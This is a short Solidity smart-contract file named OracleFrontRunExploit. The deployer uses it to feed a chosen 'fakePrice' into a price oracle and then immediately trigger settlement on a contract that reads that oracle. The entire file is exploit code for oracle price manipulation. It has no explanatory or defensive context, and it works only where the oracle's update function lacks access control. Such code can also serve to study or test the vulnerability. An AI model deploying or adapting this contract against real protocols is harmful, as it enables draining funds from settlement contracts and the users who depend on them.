// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IOracle {
    function updatePrice(uint256 newPrice) external;
}

interface IContractUsingOracle {
    function triggerSettlement() external;
}

contract OracleFrontRunExploit {
    IOracle public oracle;
    IContractUsingOracle public settlement;
    address public owner;

    constructor(address _oracle, address _settlement) {
        oracle = IOracle(_oracle);
        settlement = IContractUsingOracle(_settlement);
        owner = msg.sender;
    }

    function manipulateThenSettle(uint256 fakePrice) external {
        require(msg.sender == owner, "Only owner");
        oracle.updatePrice(fakePrice);
        settlement.triggerSettlement();
    }
}
